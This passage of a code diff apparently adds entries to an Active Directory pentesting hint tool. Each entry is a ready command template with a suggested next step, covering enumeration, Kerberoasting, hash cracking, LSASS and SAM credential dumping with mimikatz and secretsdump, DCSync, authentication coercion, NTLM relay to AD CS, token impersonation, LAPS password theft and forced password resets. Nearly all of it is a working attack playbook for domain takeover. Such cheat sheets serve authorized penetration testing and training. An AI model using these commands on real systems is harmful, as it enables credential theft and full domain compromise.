+        tool='certipy', tags='CVE', comment='CVE-2022-26923, needs ADCS', next_step='lateral move (Pass the ticket), permissions (DCSync), domain admin, delete computer'),
+
+    # Valid credentials
+
+    Hint(name='Get all users', command='impacket-GetADUsers -all -dc-ip {ip} {domain}/{user}', block='valid credentials', service=None, ports=None,
+        tool='impacket', tags=None, comment=None, next_step='got username'),
+    Hint(name='Get all users', command='cme smb {ip} -u {user} -p "{password}" --users', block='valid credentials', service='SMB', ports=445,
+        tool='crackmapexec', tags=None, comment=None, next_step='got username'),
+    Hint(name='Get all users', command='ldeep ldap -u {user} -p "{password}" -d {domain} -s ldap://{ip} users', block='valid credentials', service='LDAP', ports='389 636 3268 3269',
+        tool='ldeep', tags=None, comment=None, next_step='got username'),
+
+    Hint(name='enumerate SMB share', command='cme smb {ip} -u {user} -p {password} --shares', block='valid credentials', service='SMB', ports='445',
+        tool='crackmapexec', tags=None, comment=None, next_step=None),
+
+    Hint(name='List access on smb share', command='smbmap -u "{user}" -p \'{password}\' -P 445 -H {ip}', block='valid credentials', service='SMB', ports=445, 
+        tool='smbmap', tags='', comment='', next_step=None),
+
+    Hint(name='exploit SMB share', command='cme smb {ip} -u {user} -p \'{password}\' -M slinky -o Name={filename} SERVER={ip}', block='valid credentials', service='SMB', ports='445',
+        tool='crackmapexec', tags=None, comment=None, next_step='mitm (Coerce SMB)'),
+    Hint(name='exploit SMB share', command='drop .url file', block='valid credentials', service='SMB', ports='445',
+        tool=None, tags=None, comment=None, next_step='mitm (Coerce SMB)'),
+
+    Hint(name='Bloodhound', command='bloodhound-python -d {domain} -u {user} -p \'{password}\' -gc {dc} -c all', block='valid credentials', service=None, ports=None,
+        tool='bloodhound-python', tags='hot', comment=None, next_step='permissions (ACL), kerberos delegation, got username'),
+    Hint(name='Bloodhound', command='bloodhound-python -d {domain} -u {user} -p \'{password}\' -gc {domain} -ns {ip} -c all --zip', block='valid credentials', service=None, ports=None,
+        tool='bloodhound-python', tags='hot', comment=None, next_step='permissions (ACL), kerberos delegation, got username'),
+    Hint(name='Bloodhound', command='./rusthound -d {domain} -u "{user}@{domain}" -p "{password}" -o {outfile} -z', block='valid credentials', service=None, ports=None,
+        tool='rusthound', tags='hot', comment=None, next_step='permissions (ACL), kerberos delegation, got username'),
+    Hint(name='Bloodhound', command='import-module sharphound.ps1; invoke-bloodhound -collectionmethod all -domain {domain}', block='valid credentials', service=None, ports=None,
+        tool='powershell', tags='hot Windows', comment=None, next_step='permissions (ACL), kerberos delegation, got username'),
+    Hint(name='Bloodhound', command='sharphound.exe -c all -d {domain}', block='valid credentials', service=None, ports=None,
+        tool='sharphound.exe', tags='hot Windows', comment=None, next_step='permissions (ACL), kerberos delegation, got username'),
+
+    Hint(name='enum ldap', command='ldeep ldap -u {user} -p "{password}" -d {domain} -s ldap://{ip} all {backup_folder}', block='valid credentials', service='LDAP', ports='389 636 3268 3269',
+        tool='ldeep', tags=None, comment=None, next_step='permissions (ACL), kerberos delegation, got username'),
+    Hint(name='enum ldap', command='ldeep ldap -u {user} -p "{password}" -d {domain} -s ldap://{ip} all {backup_folder}', block='valid credentials', service='LDAP', ports='389 636 3268 3269',
+        tool='ldeep', tags=None, comment=None, next_step='permissions (ACL), kerberos delegation, got username'),
+
+    Hint(name='Powerview', command=None, block='valid credentials', service=None, ports=None,
+        tool='PowerView', tags='Windows', comment=None, next_step='permissions (ACL), kerberos delegation, got username'),
+
+    Hint(name='SharpView', command=None, block='valid credentials', service=None, ports=None,
+        tool='SharpView', tags='Windows', comment=None, next_step='permissions (ACL), kerberos delegation, got username'),
+
+    Hint(name='adPeas', command=None, block='valid credentials', service=None, ports=None,
+        tool='adPeas', tags='Windows', comment=None, next_step='permissions (ACL), kerberos delegation, got username'),
+
+    Hint(name='pingcastle', command=None, block='valid credentials', service=None, ports=None,
+        tool='pingcastle', tags='Windows', comment=None, next_step=None),
+
+    Hint(name='Get kerberoastable users', command='Get-DomainUser -SPN -Properties SamAccountName, ServicePrincipalName', block='valid credentials', service='Kerberos', ports='88',
+        tool='PowerView', tags='hot kerberoasting Windows', comment=None, next_step=None),
+    Hint(name='Get kerberoastable users', command='MATCH (u:User {hasspn:true}) RETURN u', block='valid credentials', service='Kerberos', ports='88',
+        tool='Bloodhound', tags='hot kerberoasting', comment=None, next_step=None),
+    Hint(name='Get kerberoastable users', command='MATCH (u:User {hasspn:true}), (c:Computer), p=shortestPath((u)-[*1..]->(c)) RETURN p', block='valid credentials', service='Kerberos', ports='88',
+        tool='Bloodhound', tags='hot kerberoasting', comment=None, next_step=None),
+    Hint(name='Get kerberoastable users', command='impacket-GetUserSPNs -dc-ip {ip} {domain}/{user}:{password}', block='valid credentials', service='Kerberos', ports='88',
+        tool='impacket', tags='hot kerberoasting', comment=None, next_step='kerberoasting'),
+    Hint(name='Get hash', command='impacket-GetUserSPNs -request -dc-ip {ip} {domain}/{user}:{password}', block='valid credentials', service='Kerberos', ports='88',
+        tool='impacket', tags='hot kerberoasting', comment=None, next_step='cracking (TGS)'),
+    Hint(name='Get hash', command=None, block='valid credentials', service='Kerberos', ports='88',
+        tool='Rubeus', tags='hot kerberoasting Windows', comment=None, next_step='cracking (TGS)'),
+    Hint(name='Get hash', command=r'.\Rubeus.exe kerberoast /creduser:{domain}\{user} /credpassword:{password} /domain:{domain} /dc:{dc}', block='valid credentials', service='Kerberos', ports='88',
+        tool='Rubeus', tags='hot kerberoasting Windows', comment=None, next_step='cracking (TGS)'),
+
+    Hint(name='Enumerate DNS', command=r'dnstool.py -u "{domain}\{user}" -p "{password}" --record "*" --action query {ip}', block='valid credentials', service='DNS', ports='53',
+        tool='dnstool.py', tags=None, comment=None, next_step='no credentials'),
+    
+    Hint(name='Enumerate AD CS', command='certipy find -u {user}@{domain} -p \'{password}\' -dc-ip {ip}', block='valid credentials', service=None, ports=None,
+        tool='certipy', tags='hot', comment='helps if user is Cert Publishers', next_step='adcs configuration'),
+    Hint(name='Enumerate AD CS', command='certipy find -u {user}@{domain} -p \'{password}\' -dc-ip {ip} -vulnerable', block='valid credentials', service=None, ports=None,
+        tool='certipy', tags='hot', comment='helps if user is Cert Publishers', next_step='adcs configuration'),
+
+    Hint(name='Enumerate Azure AD connect', command='cme ldap {ip} -u {user} -p {password} -M get-desc-users | grep -i MSOL', block='valid credentials', service='LDAP', ports='389 636 3268 3269',
+        tool='crackmapexec', tags=None, comment='find AAD connect server from MSOL description', next_step=None),
+
+    Hint(name='Coerce WebDAV', command='cme smb {ip} -u {user} -p {password} -M webdav', block='valid credentials', service='SMB', ports='445',
+        tool='crackmapexec', tags=None, comment='find', next_step=None),
+    Hint(name='Coerce WebDAV', command='cme smb {ip} -u {user} -p {password} -M drop-sc', block='valid credentials', service='SMB', ports='445',
+        tool='crackmapexec', tags=None, comment='start webdav with Documents.searchConnector-ms file', next_step=None),
+    Hint(name='Coerce WebDAV', command=r'dnstool.py -u "{domain}\{user}" -p "{password}" --record "{attack_name}" --action add --data {ip_listen} {dc_ip}', block='valid credentials', service='DNS', ports='53',
+        tool='dnstool.py', tags=None, comment='add attack computer in DNS', next_step=None),
+    Hint(name='Coerce WebDAV', command=r'dnstool.py -u "{domain}\{user}" -p "{password}" --record "{attack_name}" --action add --data {ip_listen} {dc_ip}', block='valid credentials', service=None, ports=None,
+        tool=None, tags=None, comment='coerce with {attacker_hostname}@80/something as target', next_step='mitm (Coerce HTTP)'),
+
+    Hint(name='Coerce SMB', command='impacket-rpcdump {domain}/{user}:{password}@{ip} | grep MS-RPRN', block='valid credentials', service='RPC', ports=None,
+        tool='impacket', tags=None, comment=None, next_step='mitm (Coerce SMB)'),
+    Hint(name='Coerce SMB', command='printerbug.py "{domain}/{username}:{password}"@{printer_ip} {listener_ip}', block='valid credentials', service=None, ports=None,
+        tool='printerbug.py', tags=None, comment=None, next_step='mitm (Coerce SMB)'),
+    Hint(name='Coerce SMB', command='PetitPotam.py -d {domain} -u {user} -p {password} {listener_ip} {target_ip}', block='valid credentials', service=None, ports=None,
+        tool='PetitPotam', tags=None, comment=None, next_step='mitm (Coerce SMB)'),
+    Hint(name='Coerce SMB', command='coercer.py -u {user} -d {domain} -p {password} -t {target} -l {attacker_ip}', block='valid credentials', service=None, ports=None,
+        tool='coercer.py', tags='hot', comment=None, next_step='mitm (Coerce SMB)'),
+
+    Hint(name='exploit', command=None, block='valid credentials', service=None, ports=None,
+        tool=None, tags=None, comment=None, next_step='known vulnerabilities'),
+
+    Hint(name='connect to computer', command=None, block='valid credentials', service=None, ports=None,
+        tool=None, tags=None, comment=None, next_step='lateral move'),
+
+    # Cracking
+
+    Hint(name='LM', command='john --format=lm {hash_file}', block='cracking', service=None, ports=None,
+        tool='john', tags=None, comment=None, next_step='valid credentials'),
+    Hint(name='LM', command='hashcat -m 3000 -a 3 {hash_file}', block='cracking', service=None, ports=None,
+        tool='hashcat', tags=None, comment=None, next_step='valid credentials'),
+    Hint(name='NTLM', command='john --format=nt {hash_file}', block='cracking', service=None, ports=None,
+        tool='john', tags=None, comment=None, next_step='valid credentials'),
+    Hint(name='NTLM', command='hashcat -m 1000 -a 3 {hash_file}', block='cracking', service=None, ports=None,
+        tool='hashcat', tags=None, comment=None, next_step='valid credentials'),
+    Hint(name='NetNTLMv1', command='john --format=netntlm {hash_file}', block='cracking', service=None, ports=None,
+        tool='john', tags=None, comment=None, next_step='valid credentials'),
+    Hint(name='NetNTLMv1', command='hashcat -m 5500 -a 3 {hash_file}', block='cracking', service=None, ports=None,
+        tool='hashcat', tags=None, comment=None, next_step='valid credentials'),
+    Hint(name='NetNTLMv1', command=None, block='cracking', service=None, ports=None,
+        tool=None, tags=None, comment='https://crack.sh', next_step='valid credentials'),
+    Hint(name='NetNTLMv2', command='john --format=netntlmv2 {hash_file}', block='cracking', service=None, ports=None,
+        tool='john', tags=None, comment=None, next_step='valid credentials'),
+    Hint(name='NetNTLMv2', command='hashcat -m 5600 -a 0 {hash_file} {passwords_dict}', block='cracking', service=None, ports=None,
+        tool='hashcat', tags=None, comment=None, next_step='valid credentials'),
+    Hint(name='Kerberos 5 TGS', command='hashcat -m 13100 -a 0 {spn_file} {passwords_dict}', block='cracking', service=None, ports=None,
+        tool='hashcat', tags=None, comment=None, next_step='valid credentials'),
+    Hint(name='Kerberos 5 TGS', command='john {spn_file} --format=krb5tgs --wordlist={passwords_dict}', block='cracking', service=None, ports=None,
+        tool='john', tags=None, comment=None, next_step='valid credentials'),
+    Hint(name='Kerberos 5 TGS AES128', command='hashcat -m 19600 -a 0 {spn_file} {passwords_dict}', block='cracking', service=None, ports=None,
+        tool='hashcat', tags=None, comment=None, next_step='valid credentials'),
+    Hint(name='Kerberos 5 TGS 256', command='hashcat -m 19700 -a 0 {spn_file} {passwords_dict}', block='cracking', service=None, ports=None,
+        tool='hashcat', tags=None, comment=None, next_step='valid credentials'),
+    Hint(name='Kerberos ASREP', command='hashcat -m 18200 -a 0 {hash_file} {passwords_dict}', block='cracking', service=None, ports=None,
+        tool='hashcat', tags=None, comment=None, next_step='valid credentials'),
+    Hint(name='MsCache 2', command='hashcat -m 2100 -a 9 {mscache_hash} {passwords_dict}', block='cracking', service=None, ports=None,
+        tool='hashcat', tags=None, comment='slow', next_step='valid credentials'),
+
+    # Administrator access
+
+    Hint(name='Extract credentials from LSASS', command='PPLdump64.exe <lsass.exe|lsass_pid> lsass.dmp', block='administrator access', service=None, ports=None,
+        tool='PPLdump64.exe', tags='Windows', comment='LSASS as a Protected Process', next_step=None),
+    Hint(name='Extract credentials from LSASS', command='mimikatz "!+" "!processprotect /process:lsass.exe /remove" "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "!processprotect /process:lsass.exe" "!-"', block='administrator access', service=None, ports=None,
+        tool='mimikatz', tags='Windows', comment='LSASS as a Protected Process, with mimidriver.sys', next_step=None),
+    Hint(name='Extract credentials from LSASS', command='procdump.exe -accepteula -ma lsass.exe lsass.dmp', block='administrator access', service=None, ports=None,
+        tool='procdump.exe', tags='Windows', comment=None, next_step='valid credentials, cracking (NTLM), lateral move (Pass the hash/Pass the key/cleartext)'),
+    Hint(name='Extract credentials from LSASS', command='mimikatz "privilege::debug" "sekurlsa::minidump lsass.dmp" "sekurlsa::logonPasswords" "exit"', block='administrator access', service=None, ports=None,
+        tool='mimikatz', tags='Windows', comment=None, next_step='valid credentials, cracking (NTLM), lateral move (Pass the hash/Pass the key/cleartext)'),
+    Hint(name='Extract credentials from LSASS', command='mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "exit"', block='administrator access', service=None, ports=None,
+        tool='mimikatz', tags='Windows', comment=None, next_step='valid credentials, cracking (NTLM), lateral move (Pass the hash/Pass the key/cleartext)'),
+    Hint(name='Extract credentials from LSASS', command='load kiwi   creds_all', block='administrator access', service=None, ports=None,
+        tool='metasploit', tags=None, comment=None, next_step='valid credentials, cracking (NTLM), lateral move (Pass the hash/Pass the key/cleartext)'),
+    Hint(name='Extract credentials from LSASS', command='cme smb {subnet} -u {user} -p {password} -M lsassy', block='administrator access', service='SMB', ports='445',
+        tool='crackmapexec', tags=None, comment=None, next_step='valid credentials, cracking (NTLM), lateral move (Pass the hash/Pass the key/cleartext)'),
+    Hint(name='Extract credentials from LSASS', command='lsassy -d {domain} -u {user} -p {password} {ip}', block='administrator access', service=None, ports=None,
+        tool='lsassy', tags='hot', comment=None, next_step='valid credentials, cracking (NTLM), lateral move (Pass the hash/Pass the key/cleartext)'),
+
+    Hint(name='Extract credentials from SAM', command='cme smb {subnet} -u {user} -p "{password}" --sam', block='administrator access', service='SMB', ports='445',
+        tool='crackmapexec', tags=None, comment=None, next_step='cracking (NTLM), lateral move (Pass the Hash)'),
+    Hint(name='Extract credentials from SAM', command='hashdump', block='administrator access', service=None, ports=None,
+        tool='metasploit', tags=None, comment=None, next_step='cracking (NTLM), lateral move (Pass the Hash)'),
+    Hint(name='Extract credentials from SAM', command=r'reg save HKLM\SAM {file}; reg save HKLM\SECURITY {file}; reg save HKLM\SYSTEM {file}', block='administrator access', service=None, ports=None,
+        tool='shell', tags='Windows', comment=None, next_step='cracking (NTLM), lateral move (Pass the Hash)'),
+    Hint(name='Extract credentials from SAM', command='impacket-secretsdump -system SYSTEM -sam SAM LOCAL', block='administrator access', service=None, ports=None,
+        tool='impacket', tags=None, comment=None, next_step='cracking (NTLM), lateral move (Pass the Hash)'),
+    Hint(name='Extract credentials from SAM', command='diskshadow list shadows all', block='administrator access', service=None, ports=None,
+        tool='shell', tags='Windows', comment='shadow copies', next_step='cracking (NTLM), lateral move (Pass the Hash)'),
+    Hint(name='Extract credentials from SAM', command=r'mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\ ', block='administrator access', service=None, ports=None,
+        tool='shell', tags='Windows', comment='shadow copies', next_step='cracking (NTLM), lateral move (Pass the Hash)'),
+    Hint(name='Extract credentials from SAM', command='mimikatz "privilege::debug" "lsadump::sam" "exit"', block='administrator access', service=None, ports=None,
+        tool='mimikatz', tags='Windows', comment=None, next_step='cracking (NTLM), lateral move (Pass the Hash)'),
+    Hint(name='Extract credentials from SAM', command='impacket-secretsdump {domain}/{user}:{password}@{ip}', block='administrator access', service=None, ports=None,
+        tool='impacket', tags='hot', comment=None, next_step='cracking (NTLM), lateral move (Pass the Hash)'),
+    Hint(name='Extract credentials from SAM', command=r'impacket-reg {domain}/{user}:{password}@{ip} backup -o "\\{smb_ip}\share"', block='administrator access', service=None, ports=None,
+        tool='impacket', tags=None, comment=None, next_step='cracking (NTLM), lateral move (Pass the Hash)'),
+    Hint(name='Extract credentials from SAM', command='impacket-secretsdump -sam {sam_file} -system {system_file} LOCAL', block='administrator access', service=None, ports=None,
+        tool='impacket', tags=None, comment=None, next_step='cracking (NTLM), lateral move (Pass the Hash)'), 
+
+    Hint(name='Extract credentials from LSA', command='cme smb {subnet} -u {user} -p "{password}" --lsa', block='administrator access', service='SMB', ports='445',
+        tool='crackmapexec', tags=None, comment=None, next_step='cracking (MsCache2 - cached domain logon), valid credentials (machine account/service account)'),
+    Hint(name='Extract credentials from LSA', command='impacket-secretsdump {domain}/{user}:{password}@{ip}', block='administrator access', service=None, ports=None,
+        tool='impacket', tags='hot', comment=None, next_step='cracking (MsCache2 - cached domain logon), valid credentials (machine account/service account)'),
+    Hint(name='Extract credentials from LSA', command=r'impacket-reg {domain}/{user}:{password}@{ip} backup -o "\\{smb_ip}\share"', block='administrator access', service=None, ports=None,
+        tool='impacket', tags=None, comment=None, next_step='cracking (MsCache2 - cached domain logon), valid credentials (machine account/service account)'),
+    Hint(name='Extract credentials from LSA', command='impacket-secretsdump -security {security_file} -system {system_file} LOCAL', block='administrator access', service=None, ports=None,
+        tool='impacket', tags=None, comment=None, next_step='cracking (MsCache2 - cached domain logon), valid credentials (machine account/service account)'),
+
+    Hint(name='dpapi extract', command='DonPAPI.py {domain}/{user}:{password}@{ip}', block='administrator access', service=None, ports=None,
+        tool='DonPAPI', tags='hot', comment=None, next_step='valid credentials, lateral move (cleartext)'),
+    Hint(name='dpapi extract', command='mimikatz.exe "sekurlsa::dpapi"', block='administrator access', service=None, ports=None,
+        tool='mimikatz', tags='Windows', comment=None, next_step='valid credentials, lateral move (cleartext)'),
+    Hint(name='dpapi extract', command='impacket-secretsdump {domain}/{user}:{password}@{ip}', block='administrator access', service=None, ports=None,
+        tool='impacket', tags=None, comment=None, next_step='valid credentials, lateral move (cleartext)'),
+
+    Hint(name='search password files', command='findstr /si "password" *.txt *.xml *.docx', block='administrator access', service=None, ports=None,
+        tool='shell', tags='Windows', comment=None, next_step='valid credentials, lateral move (cleartext)'),
+
+    Hint(name='search stored password', command='lazagne.exe all', block='administrator access', service=None, ports=None,
+        tool='lazagne.exe', tags='Windows', comment=None, next_step='valid credentials, lateral move (cleartext)'),
+
+    Hint(name='chrome', command='SharpChromium.exe', block='administrator access', service=None, ports=None,
+        tool='SharpChromium.exe', tags='Windows', comment=r'%appdata%\Local\Google\Chrome\User Data\Default', next_step='valid credentials, lateral move (cleartext)'),
+
+    Hint(name='token manipulation', command=r'.\incognito.exe list_tokens -u', block='administrator access', service=None, ports=None,
+        tool='incognito.exe', tags='Windows', comment=None, next_step='valid credentials, permissions (ACL)'),
+    Hint(name='token manipulation', command='incognito.exe execute -c "{domain}/{user}" powershell.exe', block='administrator access', service=None, ports=None,
+        tool='incognito.exe', tags='Windows', comment=None, next_step='valid credentials, permissions (ACL)'),
+    Hint(name='token manipulation', command=r'use incognito    impersonate_token {domain}\\{user}', block='administrator access', service=None, ports=None,
+        tool='metasploit', tags=None, comment=None, next_step='valid credentials, permissions (ACL)'),
+    Hint(name='token manipulation', command='cme smb {ip} -u {user} -p {password} -M impersonate', block='administrator access', service='SMB', ports='445',
+        tool='crackmapexec', tags=None, comment=None, next_step='valid credentials, permissions (ACL)'),
+    Hint(name='token manipulation', command='irs.exe list        irs.exe exec --pid {pid} --command {command}', block='administrator access', service=None, ports=None,
+        tool='irs.exe', tags='Windows', comment=None, next_step='valid credentials, permissions (ACL)'),
+    Hint(name='token manipulation', command='masky -d {domain} -u {user} (-p {password} || -k || -H {hash}) -ca {ca} {ip}', block='administrator access', service=None, ports=None,
+        tool='masky', tags=None, comment='Extract creds with certificate authentication (ADCS required)', next_step='cracking (NT), lateral move (Pass the hash, Pass the ticket - ccache, Pass the certificate - pfx)'),
+    Hint(name='impersonate RDP session', command='psexec -s -i cmd', block='administrator access', service=None, ports=None,
+        tool='psexec', tags='Windows', comment=None, next_step='lateral move (RDP)'),
+    Hint(name='impersonate RDP session', command='query user', block='administrator access', service=None, ports=None,
+        tool=None, tags='Windows', comment=None, next_step='lateral move (RDP)'),
+    Hint(name='impersonate RDP session', command='cmd /k tscon {id} /dest:console', block='administrator access', service=None, ports=None,
+        tool=None, tags='Windows', comment=None, next_step='lateral move (RDP)'),
+
+    Hint(name='Dump cleartext password of MSOL Account on AAD Connect server', command='azuread_decrypt_msol_v2.ps1', block='administrator access', service=None, ports=None,
+        tool='powershell', tags='Windows', comment='Hybrid Environment (Azure AD Connect)', next_step='permissions (DCSync)'),
+    Hint(name='Dump cleartext password of MSOL Account on AAD Connect server', command='cme smb {ip} -u {user} -p {password} -M msol', block='administrator access', service='SMB', ports='445',
+        tool='crackmapexec', tags=None, comment='Hybrid Environment (Azure AD Connect)', next_step='permissions (DCSync)'),
+
+    # Permissions move
+
+    Hint(name='DCSync', command=None, block='permissions', service=None, ports=None,
+        tool=None, tags='hot', comment='Administrators, Domain Admins, Enterprise Admins, DC computer accounts', next_step='domain admin, lateral move, cracking'),
+    Hint(name='DCSync', command=r'mimikatz "lsadump::dcsync /domain:{domain} /user:{domain}\administrator"', block='permissions', service=None, ports=None,
+        tool='mimikatz', tags='hot Windows', comment=None, next_step='domain admin, lateral move, cracking'),
+    Hint(name='DCSync', command='impacket-secretsdump "{domain}"/"{user}":"{password}"@"{dc}"', block='permissions', service=None, ports=None,
+        tool='impacket', tags='hot', comment=None, next_step='domain admin, lateral move, cracking'),
+ 
+     Hint(name='can change msDS-KeyCredentialLink (Generic Write) + ADCS', command='Whisker.exe', block='permissions', service=None, ports=None,
+        tool='Whisker.exe', tags=None, comment='Shadow Credentials (need ADCS)', next_step='lateral move (Pass the certificate)'),
+    Hint(name='can change msDS-KeyCredentialLink (Generic Write) + ADCS', command='certipy shadow auto -u "{user}@{domain}" -p {password} -account "{target_account}"', block='permissions', service=None, ports=None,
+        tool='certipy', tags=None, comment='Shadow Credentials (need ADCS)', next_step='lateral move (Pass the certificate)'),
+    Hint(name='can change msDS-KeyCredentialLink (Generic Write) + ADCS', command='pywhisker.py -d "{fqdn_domain}" -u "{user}" -p "{certificate_password}" --target "{target_samname}" --action "list"', block='permissions', service=None, ports=None,
+        tool='pywhisker.py', tags=None, comment='Shadow Credentials (need ADCS)', next_step='lateral move (Pass the certificate)'),
+
+    Hint(name='Self-Membership on Group / GenericAll/WriteProperty on Group / WriteProperty (Self-Membership)', command='net group "{group}" {user} /add /domain', block='permissions', service=None, ports=None,
+        tool='net', tags='Windows', comment='add group member', next_step='permissions (ACL)'),
+    Hint(name='Self-Membership on Group / GenericAll/WriteProperty on Group / WriteProperty (Self-Membership)', command='ldeep ldap -u {user} -p {password} -d {domain} -s ldap://{ip} add_to_group "CN={user},DC={domain}" "CN={group},DC={domain}"', block='permissions', service='LDAP', ports='389 636 3268 3269',
+        tool='ldeep', tags=None, comment='add group member', next_step='permissions (ACL)'),
+
+    Hint(name='WriteOwner on Group', command='owneredit.py', block='permissions', service=None, ports=None,
+        tool='impacket', tags=None, comment='WriteDACL + WriteOwner give yourself Generic all, https://blog.ryuki.dev/ctf/htb/machines/season-7/escapetwo', next_step=None),
+    Hint(name='WriteOwner on Group', command='dacledit.py', block='permissions', service=None, ports=None,
+        tool='impacket', tags=None, comment='WriteDACL + WriteOwner give yourself Generic all', next_step=None),
+
+    Hint(name='GenericAll / GenericWrite on Computer', command=None, block='permissions', service=None, ports=None,
+        tool=None, tags=None, comment='msDs-AllowedToActOnBehalf', next_step='kerberos delegation (RBCD)'),
+    Hint(name='GenericAll / GenericWrite on Computer', command=None, block='permissions', service=None, ports=None,
+        tool=None, tags=None, comment='add Key Credentials', next_step='permissions (shadow credentials)'),
+
+    Hint(name='GenericAll / GenericWrite on User', command='net user {user} {password} /domain', block='permissions', service=None, ports=None,
+        tool='net', tags='Windows', comment='change password', next_step='valid credentials'),
+    Hint(name='GenericAll / GenericWrite on User', command='targetedKerberoast.py -d {domain} -u {user} -p {password}', block='permissions', service='Kerberos', ports='88',
+        tool='targetedKerberoast.py', tags=None, comment='add SPN (target Kerberoasting)', next_step='cracking (TGS)'),
+    Hint(name='GenericAll / GenericWrite on User', command=None, block='permissions', service=None, ports=None,
+        tool=None, tags=None, comment='add Key Credentials', next_step='permissions (shadow credentials)'),
+    Hint(name='GenericAll / GenericWrite on User', command=None, block='permissions', service=None, ports=None,
+        tool=None, tags=None, comment='logon script', next_step='privilege escalation'),
+
+    Hint(name='ForceChangePassword on User', command='net user {user} {password} /domain', block='permissions', service=None, ports=None,
+        tool='net', tags='Windows', comment=None, next_step='valid credentials'),
+    Hint(name='ForceChangePassword on User', command='net rpc password {user} {password} -S {dc_fqdn}', block='permissions', service='RPC', ports=None,
+        tool='net', tags=None, comment=None, next_step='valid credentials'),
+
+    Hint(name='aclpwn.py', command='aclpwn.py', block='permissions', service=None, ports=None,
+        tool='aclpwn.py', tags=None, comment=None, next_step=None),
+
+    Hint(name='acltoolkit', command='acltoolkit {domain}/{user}:"{password}"@{ip} get-objectacl [all | -object {object}]', block='permissions', service=None, ports=None,
+        tool='acltoolkit', tags=None, comment=None, next_step=None),
+
+    Hint(name='get LAPS password', command='MATCH p=(g:Group)-[:ReadLAPSPassword]->(c:Computer) RETURN p', block='permissions', service=None, ports=None,
+        tool='Bloodhound', tags=None, comment='who can read LAPS', next_step=None),
+
+    Hint(name='get LAPS passwords', command=r'Get-LAPSPassswords -DomainController {ip} -Credential {domain}\{user} | Format-Table -AutoSize', block='permissions', service=None, ports=None,
+        tool='powershell', tags='Windows', comment=None, next_step='administrator access'),
+    Hint(name='get LAPS passwords', command='foreach ($objResult in $colResults){$objComputer = $objResult.Properties; $objComputer.name |where {$objcomputer.name -ne $env:computername}|%{foreach-object {Get-AdmPwdPassword -Computername $_}}}', block='permissions', service=None, ports=None,
+        tool='powershell', tags='Windows', comment=None, next_step='administrator access'),
+    Hint(name='get LAPS passwords', command='cme ldap {ip} -d {domain} -u {user} -p {password} --module laps', block='permissions', service='LDAP', ports='389 636 3268 3269',
+        tool='crackmapexec', tags=None, comment=None, next_step='administrator access'),
+    Hint(name='get LAPS passwords', command='post/windows/gather/credentials/enum_laps', block='permissions', service=None, ports=None,
+        tool='metasploit', tags=None, comment=None, next_step='administrator access'),
+
+    Hint(name='GPO', command='MATCH (gr:Group), (gp:GPO), p=((gr)-[:GenericWrite]->(gp)) RETURN p', block='permissions', service=None, ports=None,
+        tool='Bloodhound', tags=None, comment=None, next_step=None),
+    Hint(name='GPO', command='Get-DomainObjectAcl -SearchBase "CN=Policies,CN=System,DC={domain}" -ResolveGUIDs | ? { $_.ObjectAceType -eq "Group-Policy-Container" } | select ObjectDN, ActiveDirectoryRights, SecurityIdentifier | fl', block='permissions', service=None, ports=None,
+        tool='PowerView', tags=None, comment='SID of principals that can create new GPOs in the domain', next_step=None),
+    Hint(name='GPO', command='Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ObjectAceType -eq "GP-Link" -and $_.ActiveDirectoryRights -match "WriteProperty" } | select ObjectDN, SecurityIdentifier | fl', block='permissions', service=None, ports=None,
+        tool='PowerView', tags=None, comment='return the principasls that can write to the GP-Link attribute on OUs', next_step=None),
+    Hint(name='GenericWrite on GPO', command=None, block='permissions', service=None, ports=None,
+        tool=None, tags=None, comment=None, next_step='privilege escalation'),
+    Hint(name='DNSadmins abuse', command='dnscmd.exe localhost /config /serverlevelplugindll {dll_path}', block='permissions', service=None, ports=None,
+        tool='dnscmd.exe', tags='CVE', comment='CVE-2021-40469, needs dnsadmin user, `sc.exe \\DNSServer stop dns`, `sc \\DNSServer start dns`', next_step='administrator access'),
+   
+    # Weak ADCS configuration
+
+    Hint(name='ESC8 (web enrollment is up)', command='impacket-ntlmrelayx -t http://{ip}/certsrv/certfnsh.asp -debug -smb2support --adcs --template DomainController', block='adcs configuration', service=None, ports=None,
+        tool='impacket', tags='hot certificate', comment=None, next_step='lateral move (Pass the ticket) -> permissions (DCSync) -> domain admin'),
+    Hint(name='ESC8 (web enrollment is up)', command='Rubeus.exe asktgt /user:{user} /certificate:{base64_certificate} /ptt', block='adcs configuration', service=None, ports=None,
+        tool='Rubeus', tags='hot Windows certificate', comment=None, next_step='lateral move (Pass the ticket) -> permissions (DCSync) -> domain admin'),
+    Hint(name='ESC8 (web enrollment is up)', command='gettgtpkinit.py -pfx-base64 $(cat {base64_certificate}) {doomain}/{dc_name}$ {ccache_file}', block='adcs configuration', service=None, ports=None,
+        tool='gettgtpkinit.py', tags='hot certificate', comment=None, next_step='lateral move (Pass the ticket) -> permissions (DCSync) -> domain admin'),
+    Hint(name='ESC8 (web enrollment is up)', command='certipy relay -ca {ca_ip} -template DomainController', block='adcs configuration', service=None, ports=None,
+        tool='certipy', tags='hot certificate', comment=None, next_step='lateral move (Pass the ticket) -> permissions (DCSync) -> domain admin'),
+    Hint(name='ESC8 (web enrollment is up)', command='certipy auth -pfx {certificate} -dc-ip {ip}', block='adcs configuration', service=None, ports=None,
+        tool='certipy', tags='hot certificate', comment=None, next_step='lateral move (Pass the ticket) -> permissions (DCSync) -> domain admin'),
+
+    Hint(name='Detect misconfigured Certificate Templates', command='certutil -v -dsTemplate', block='adcs configuration', service=None, ports=None,
+        tool='certutil', tags='Windows certificate', comment=None, next_step='adcs configuration (ESC1, ESC2, ESC3)'),
+    Hint(name='Detect misconfigured Certificate Templates', command='certify.exe find [/vulnerable]', block='adcs configuration', service=None, ports=None,
+        tool='certify.exe', tags='Windows certificate', comment=None, next_step='adcs configuration (ESC1, ESC2, ESC3)'),
+    Hint(name='Detect misconfigured Certificate Templates', command='certipy find -u {user}@{domain} -p \'{password}\' -dc-ip {ip}', block='adcs configuration', service=None, ports=None,
+        tool='certipy', tags='certificate', comment=None, next_step='adcs configuration (ESC1, ESC2, ESC3)'),
+
+    #Hint(name='ESC1 (Request a certificate from vulnerable misconfigured Certificate Template)', command='certipy req -u {user}@{domain} -p \'{password}\' -target {ca_server} -template "{vulnerable_template_name}" -ca {ca_name} -dc-ip {ip} -upn {target_user}@{domain}', block='adcs configuration', service=None, ports=None,
